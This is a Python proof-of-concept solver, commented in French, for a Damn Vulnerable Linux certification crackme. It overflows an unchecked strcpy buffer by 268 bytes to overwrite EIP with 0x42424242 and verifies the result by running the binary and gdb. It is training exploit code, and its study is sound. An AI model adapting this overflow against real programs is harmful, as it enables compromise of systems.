#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solveur / PoC — cesd_dvl_assessment_3 (zero, « 01_exploitme03 »).

Assessment 03 de la certification CESD (Damn Vulnerable Linux). main() :
    strcpy(buf, argv[1])   avec buf = [ebp-0x108], aucun controle de longueur.

buf a ebp-0x108, adresse de retour sauvegardee a ebp+4 :
    offset buf -> EIP = 0x108 + 4 = 0x10c = 268 octets.
Pas de prefixe (contrairement a l'assessment 02) : strcpy ecrase directement.

Usage :
  ./crackmes-de-cesd_dvl_assessment_3-solve.py
  ./crackmes-de-cesd_dvl_assessment_3-solve.py --run BIN
  ./crackmes-de-cesd_dvl_assessment_3-solve.py --gdb BIN
"""
import sys, subprocess, struct, os, tempfile, zipfile

OFFSET = 0x108 + 4        # = 268
NEW_EIP = 0x42424242      # "BBBB"


def payload(eip=NEW_EIP):
    return b"A" * OFFSET + struct.pack("<I", eip)


def extract_elf():
    here = os.path.dirname(os.path.abspath(__file__))
    od = os.path.join(here, "..", "original")
    zpath = os.path.join(od, [f for f in os.listdir(od) if f.endswith(".zip")][0])
    tmp = tempfile.mkdtemp(prefix="cesd03_")
    with zipfile.ZipFile(zpath) as z:
        z.extract("01_exploitme03", tmp)
    p = os.path.join(tmp, "01_exploitme03")
    os.chmod(p, 0o755)
    return p


def main():
    args = sys.argv[1:]
    if not args:
        p = payload()
        print("offset EIP : %d (0x108 + 4)" % OFFSET)
        print("EIP cible  : 0x%08x" % NEW_EIP)
        print("payload (len=%d) : %r...%r" % (len(p), p[:16], p[-4:]))
        return
    if args[0] == "--run":
        binp = args[1] if len(args) > 1 else extract_elf()
        r = subprocess.run([binp, payload().decode("latin1")])
        print("return code = %d (SIGSEGV attendu)" % r.returncode)
        sys.exit(0 if r.returncode in (139, -11) else 1)
    if args[0] == "--gdb":
        binp = args[1] if len(args) > 1 else extract_elf()
        arg = "A" * OFFSET + "BBBB"
        script = "set pagination off\nrun %s\ninfo registers eip\nquit\n" % arg
        with tempfile.NamedTemporaryFile("w", suffix=".gdb", delete=False) as f:
            f.write(script); gs = f.name
        out = subprocess.run(["gdb", "-q", "-batch", "-x", gs, binp],
                             capture_output=True, text=True)
        print(out.stdout)
        ok = "0x42424242" in out.stdout
        print("EIP controle :", "OUI" if ok else "non")
        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
